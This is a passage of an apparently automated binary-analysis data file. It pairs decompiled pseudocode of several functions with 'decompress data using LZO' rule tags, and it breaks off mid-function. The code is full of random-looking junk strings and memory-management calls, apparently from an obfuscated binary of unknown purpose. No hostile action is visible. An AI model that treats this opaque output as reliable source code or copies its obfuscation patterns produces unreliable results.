        "decompiled_code": "\nuint * fcn.00406087(uint *param_1, uint param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uint auStack100 [2];\n    char *pcStack92;\n    int32_t iStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack100;\n    uStack24 = 0x44c460;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack72 = 0;\n    uStack68 = 0xf;\n    iStack88 = 0;\n    uStack20 = 3;\n    pcStack92 = \"kuhlltanacmldfpkxdtcy\";\n    auStack100[0] = 0x15;\n    fcn.00402f72();\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x5f, uStack36, \n                 \"jstupchjirdilcvqbmtiwrztylldysojyykhotinwjaztdeuvjqewnuotmeweguqykdcdmwqsvoboitowzypbcopjmkjfve\");\n    puStack40[5] = 0xf;\n    puStack40[4] = 4;\n    *puStack40 = 0x66706e72;\n    *(puStack40 + 1) = 0;\n    if (uStack44 < 0x10) {\ncode_r0x0042ceaa:\n        if (0xf < uStack68) {\n            iVar2 = iStack88;\n            if ((0xfff < uStack68 + 1) && (iVar2 = *(iStack88 + -4),  0x1f < (iStack88 + -4) - iVar2))\n            goto code_r0x0042cf3d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x0042cf49;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack64;\n    if ((uStack44 + 1 < 0x1000) || (iVar2 = *(iStack64 + -4),  (iStack64 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042ceaa;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042cf3d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042cf49:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 869
    },
    "00406109": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00406109(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c430;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x62);\n    if (uStack40 < 0x10) {\ncode_r0x0042c8a6:\n        if (0xf < in_stack_00000028) {\n            iVar2 = in_stack_00000014;\n            if ((0xfff < in_stack_00000028 + 1) &&\n               (iVar2 = *(in_stack_00000014 + -4),  0x1f < (in_stack_00000014 + -4) - iVar2)) goto code_r0x0042c948;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar2 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar2 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar2)) goto code_r0x0042c954;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042c8a6;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042c948:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042c954:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 692
    },
    "0040611d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.0040611d(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint auStack120 [2];\n    char *pcStack112;\n    uint uStack108;\n    ushort uStack104;\n    uint uStack92;\n    uint uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ccc0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    pcStack112 = \"nvamwhojliklvdhyevs\";\n    auStack120[0] = 0x13;\n    fcn.00402f72();\n    uStack88 = 0xf;\n    uStack92 = 5;\n    uStack108 = 0x727a626d;\n    uStack104 = 0x6b;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x61, uStack36, \n                 \"fdvbstajddtcnyuzycttkseaidgliumrvbdktdmdifurcuxdaqoocjskkunkidvatkwxrqrbhhxpkkpkzqiektvjsfikjnpbm\");\n    if (0xf < uStack64) {\n        iVar1 = iStack84;\n        if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x00445dd4;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < uStack40) {\n        iVar1 = iStack60;\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1)) {\ncode_r0x00445dd4:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fcn.00403a76();\n            fVar2 = fcn.00403a76();\n            return fVar2;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return *0x542938;\n}\n",
        "token_count": 696
    },
    "00406203": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406203(int32_t param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    int32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    int32_t in_stack_00000054;\n    uint32_t in_stack_00000068;\n    uint32_t in_stack_ffffff68;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44cbb0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 9;\n    pcStack112 = \"txzogukjtkectphwxiargfczdbgaexcabxmvxhmdwzfqiujjcempyvloxuxgesqfxabaqeepknwn\";\n    auStack120[0] = 0x4c;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x4c, uStack84, \"txzogukjtkectphwxiargfczdbgaexcabxmvxhmdwzfqiujjcempyvloxuxgesqfxabaqeepknwn\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x4c, uStack36, \"txzogukjtkectphwxiargfczdbgaexcabxmvxhmdwzfqiujjcempyvloxuxgesqfxabaqeepknwn\");\n    if (uStack64 < 0x10) {\ncode_r0x004429ea:\n        if (0xf < uStack40) {\n            in_stack_ffffff68 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff68) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00442c9a;\n                in_stack_ffffff68 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x4c, in_stack_ffffff68 & 0xffffff00 | uStack84 & 0xff, \n                     \"txzogukjtkectphwxiargfczdbgaexcabxmvxhmdwzfqiujjcempyvloxuxgesqfxabaqeepknwn\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x4c, uStack36, \"txzogukjtkectphwxiargfczdbgaexcabxmvxhmdwzfqiujjcempyvloxuxgesqfxabaqeepknwn\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x00442ca6;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x00442cb2;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x00442cbe;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar3 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar3 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar3))\n            goto code_r0x00442cca;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar3 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar3 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar3)) goto code_r0x00442cd6;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000050) {\n            iVar3 = in_stack_0000003c;\n            if ((0xfff < in_stack_00000050 + 1) &&\n               (iVar3 = *(in_stack_0000003c + -4),  0x1f < (in_stack_0000003c + -4) - iVar3)) goto code_r0x00442ce2;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000068) {\n            iVar3 = in_stack_00000054;\n            if ((0xfff < in_stack_00000068 + 1) &&\n               (iVar3 = *(in_stack_00000054 + -4),  0x1f < (in_stack_00000054 + -4) - iVar3)) goto code_r0x00442cee;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    in_stack_ffffff68 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff68 < 0x1000) {\ncode_r0x004429de:\n        fcn.00401a32(uVar2);\n        goto code_r0x004429ea;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff68 = uStack64 + 0x24;\n        goto code_r0x004429de;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00442c9a:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00442ca6:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00442cb2:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00442cbe:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00442cca:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00442cd6:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00442ce2:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x00442cee:\n    uStack20 = 8;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 2092
    },
    "00406320": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00406320(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x4149d0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x13);\n    if (0xf < uStack40) {\n        iVar1 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x004121f0;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < in_stack_00000034) {\n        iVar1 = in_stack_00000020;\n        if ((0xfff < in_stack_00000034 + 1) &&\n           (iVar1 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar1)) {\ncode_r0x004121f0:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fVar2 = fcn.00403a76();\n            return fVar2;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return *0x4ea3f0;\n}\n",
        "token_count": 503
    },
    "00406398": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00406398(int32_t param_1)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 in_ST0;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c8f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (0xf < in_stack_00000018) {\n        iVar2 = param_1;\n        if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0043a547;\n        }\n        ppuStack32 = &ppuStack32;\n        in_ST0 = fcn.00401a32(iVar2);\n        ppuVar1 = ppuStack32;\n    }\n    ppuStack32 = ppuVar1;\n    if (0xf < in_stack_00000030) {\n        iVar2 = in_stack_0000001c;\n        if ((0xfff < in_stack_00000030 + 1) &&\n           (iVar2 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar2)) {\ncode_r0x0043a547:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            return *0x5425e8;\n        }\n        in_ST0 = fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return in_ST0;\n}\n",
        "token_count": 508
    },
    "0040644c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.0040644c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000010;\n    uint32_t in_stack_00000024;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c1d0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x39);\n    if (uStack40 < 0x10) {\ncode_r0x00424996:\n        if (0xf < in_stack_00000024) {\n            iVar2 = in_stack_00000010;\n            if ((0xfff < in_stack_00000024 + 1) &&\n               (iVar2 = *(in_stack_00000010 + -4),  0x1f < (in_stack_00000010 + -4) - iVar2)) goto code_r0x00424a3b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000003c) {\n            iVar2 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar2 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar2)) goto code_r0x00424a47;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0xd436;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00424996;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00424a3b:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00424a47:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 692
    },
    "00406479": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406479(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    uint32_t in_stack_ffffff14;\n    uint32_t in_stack_ffffff2c;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x4148a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 0xc;\n    pcStack136 = \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\";\n    auStack144[0] = 0x36;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x5c, iStack60, \n                 \"lggwjbjupkawlhqhyxiofutvsihwgotveytsqwwcwkvtckeevtrrafnaoznmwcyppijspqwinfpjcdusrrwcjttkxdmu\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x36, uStack84, \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0x12;\n    fcn.00402f72(0x36, uStack36, \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    if (uStack64 < 0x10) {\ncode_r0x0040e45e:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0040e89f;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xe;\n        fcn.00402f72(0x5c, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \n                     \"lggwjbjupkawlhqhyxiofutvsihwgotveytsqwwcwkvtckeevtrrafnaoznmwcyppijspqwinfpjcdusrrwcjttkxdmu\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0x11;\n        fcn.00402f72(0x5c, uStack36, \n                     \"lggwjbjupkawlhqhyxiofutvsihwgotveytsqwwcwkvtckeevtrrafnaoznmwcyppijspqwinfpjcdusrrwcjttkxdmu\");\n        if (0xf < uStack64) {\n            in_stack_ffffff2c = uStack64 + 1;\n            uVar2 = uStack84;\n            if (0xfff < in_stack_ffffff2c) {\n                uVar2 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar2) goto code_r0x0040e8ab;\n                in_stack_ffffff2c = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff2c = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff2c) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0040e8b7;\n                in_stack_ffffff2c = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xe;\n        fcn.00402f72(0x36, in_stack_ffffff2c & 0xffffff00 | uStack84 & 0xff, \n                     \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0x10;\n        fcn.00402f72(0x36, uStack36, \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n        if (0xf < uStack64) {\n            in_stack_ffffff14 = uStack64 + 1;\n            uVar2 = uStack84;\n            if (0xfff < in_stack_ffffff14) {\n                uVar2 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar2) goto code_r0x0040e8c3;\n                in_stack_ffffff14 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff14 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff14) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0040e8cf;\n                in_stack_ffffff14 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xe;\n        fcn.00402f72(0x36, in_stack_ffffff14 & 0xffffff00 | uStack84 & 0xff, \n                     \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xf;\n        fcn.00402f72(0x36, uStack36, \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x0040e8db;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x0040e8e7;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x0040e8f3;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack112) {\n            iVar3 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar3 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar3))\n            goto code_r0x0040e8ff;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar3 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar3 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar3))\n            goto code_r0x0040e90b;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar3 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar3 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar3)) goto code_r0x0040e917;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x0040e452:\n        fcn.00401a32(uVar2);\n        goto code_r0x0040e45e;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x0040e452;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0040e89f:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0040e8ab:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0040e8b7:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0040e8c3:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0040e8cf:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0040e8db:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0040e8e7:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x0040e8f3:\n    uStack20 = 8;\n    fcn.004047f5();\ncode_r0x0040e8ff:\n    uStack20 = 9;\n    fcn.004047f5();\ncode_r0x0040e90b:\n    uStack20 = 10;\n    fcn.004047f5();\ncode_r0x0040e917:\n    uStack20 = 0xb;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 3074
    },
    "004064a6": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.004064a6(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint32_t in_stack_0000004c;\n    int32_t in_stack_00000050;\n    uint32_t in_stack_00000064;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c950;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x38);\n    if (uStack40 < 0x10) {\ncode_r0x0043ad99:\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 